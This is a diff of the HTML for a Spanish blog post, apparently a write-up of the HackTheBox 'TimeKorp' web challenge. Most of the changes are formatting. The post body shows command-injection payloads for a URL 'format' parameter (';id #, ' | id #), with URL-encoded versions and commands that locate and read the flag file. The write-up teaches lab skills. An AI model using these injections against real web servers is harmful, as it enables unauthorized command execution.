@@ -18,19 +18,19 @@
 
 
 
-	<meta name="twitter:card" content="summary">
-	<meta name="twitter:title" content="TimeKorp Web Challenge - HackTheBox">
-	<meta name="twitter:description" content="Este es challenge se toca la vulnerabilidad Command Injection">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TimeKorp Web Challenge - HackTheBox">
+  <meta name="twitter:description" content="Este es challenge se toca la vulnerabilidad Command Injection">
 
 <meta property="og:url" content="https://celero0.github.io/posts/timekorp/">
-	<meta property="og:site_name" content="Celero0 Blog">
-	<meta property="og:title" content="TimeKorp Web Challenge - HackTheBox">
-	<meta property="og:description" content="Este es challenge se toca la vulnerabilidad Command Injection">
-	<meta property="og:locale" content="es">
-	<meta property="og:type" content="article">
-		<meta property="article:section" content="posts">
-		<meta property="article:published_time" content="2026-04-02T18:08:15+00:00">
-		<meta property="article:modified_time" content="2026-04-02T18:08:15+00:00">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="TimeKorp Web Challenge - HackTheBox">
+  <meta property="og:description" content="Este es challenge se toca la vulnerabilidad Command Injection">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-04-02T18:08:15+00:00">
+    <meta property="article:modified_time" content="2026-04-02T18:08:15+00:00">
 
 
 
@@ -55,7 +55,7 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.c170d9bb5caa71f3db9a208ff97e771abf73c1f55b67a1df27ba5666cd49fa9b.css" integrity="sha256-wXDZu1yqcfPbmiCP&#43;X53Gr9zwfVbZ6HfJ7pWZs1J&#43;ps=" crossorigin="anonymous" media="screen" />
   
 
 
@@ -214,30 +214,30 @@
   </a>
 </h2>
 <p>Viendo como responde la web, probablemente el servidor esté ejecutando el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its %H:%M:%S&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its %H:%M:%S&#39;</span>
 </span></span></code></pre></div><p>Dando como resultado lo que vemos en la web, como se aprecia en el siguiente ejemplo</p>
 <img src="/images/Pasted image 20260402143109.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora si borramos todos los parámetros tendríamos lo siguiente</p>
 <img src="/images/Pasted image 20260402143240.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto sabemos que nuestro input se encuentra acá</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its {input}&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its {input}&#39;</span>
 </span></span></code></pre></div><p>Para poder inyectar comandos debemos cerrar la comilla, y luego podemos comentar todo con un <code>#</code> para evitar errores.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its &#39;</span>;id <span style="color:#8b949e;font-style:italic">#&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its &#39;</span>;id <span style="color:#8b949e;font-style:italic">#&#39;</span>
 </span></span></code></pre></div><p>Quedando de la siguiente manera</p>
 <img src="/images/Pasted image 20260402143439.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por  lo tanto el parámetro de URL que mandaremos será el siguiente</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/?format<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#f85149">&#39;</span>;id <span style="color:#8b949e;font-style:italic">#</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/?format<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#f85149">&#39;</span>;id <span style="color:#8b949e;font-style:italic">#</span>
 </span></span></code></pre></div><p>Al mandarlo vemos que no nos muestra nada</p>
 <img src="/images/Pasted image 20260402143536.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Esto se debe a que no hemos realizado un <code>URL-Encode</code></p>
 <p>Por tanto realizamos la transformación con el <code>Decoder</code> de <code>Burpsuite</code></p>
 <img src="/images/Pasted image 20260402143650.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Quedando finalmente nuestro parámetro de URL así</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/?format<span style="color:#ff7b72;font-weight:bold">=</span>%27%3b%69%64%20%23
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/?format<span style="color:#ff7b72;font-weight:bold">=</span>%27%3b%69%64%20%23
 </span></span></code></pre></div><p>Vemos que ahora la web si interpreta nuestro comando <code>id</code></p>
 <img src="/images/Pasted image 20260402143746.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p><strong>NOTA:</strong> Otros payloads que también funcionarían serían los siguientes, con su respectivo <code>URL-Encoded</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; | id #
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; | id #
 </span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span>;ls<span style="color:#f85149">&#39;</span>
 </span></span></code></pre></div><h2 id="obteniendo-la-flag">
   Obteniendo la flag
@@ -247,15 +247,15 @@
   </a>
 </h2>
 <p>Ya sabiendo como inyectar comandos en la web, es sencillo poder leer la flag, para ello primero debemos encontrar la ruta de este, la cual podemos obtener con el comando <code>find</code>, de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name *flag* 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name *flag* 2&gt;/dev/null
 </span></span></code></pre></div><p>Integrado a nuestro payload y <code>URL-Encoded</code> quedarías así</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%27%3b%66%69%6e%64%20%2f%20%2d%6e%61%6d%65%20%2a%66%6c%61%67%2a%20%32%3e%2f%64%65%76%2f%6e%75%6c%6c%20%23
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%27%3b%66%69%6e%64%20%2f%20%2d%6e%61%6d%65%20%2a%66%6c%61%67%2a%20%32%3e%2f%64%65%76%2f%6e%75%6c%6c%20%23
 </span></span></code></pre></div><p>Encontrando la ruta <code>/flag</code></p>
 <img src="/images/Pasted image 20260402144110.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora solo necesitaríamos leer con <code>cat</code>, de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /flag
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /flag
 </span></span></code></pre></div><p>Integrado a nuestro payload y <code>URL-Encoded</code> quedarías así</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%27%3b%63%61%74%20%2f%66%6c%61%67%20%23
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%27%3b%63%61%74%20%2f%66%6c%61%67%20%23
 </span></span></code></pre></div><p>Así encontramos la <code>flag</code> y terminamos el <code>challenge</code></p>
 <img src="/images/Pasted image 20260402144222.png" style="width:100%; height:auto; display:block; margin:auto;">
 
